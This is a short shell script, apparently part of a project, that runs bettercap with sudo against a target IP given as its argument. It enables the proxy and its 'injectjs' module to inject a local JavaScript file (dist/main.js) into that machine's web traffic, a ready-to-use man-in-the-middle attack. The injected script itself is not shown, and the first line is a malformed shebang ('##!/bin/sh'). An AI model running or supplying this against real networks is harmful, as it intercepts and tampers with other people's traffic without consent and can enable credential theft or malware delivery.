##!/bin/sh

SOURCEIP=$1

sudo bettercap -T ${SOURCEIP} --proxy --proxy-module injectjs --js-file dist/main.js
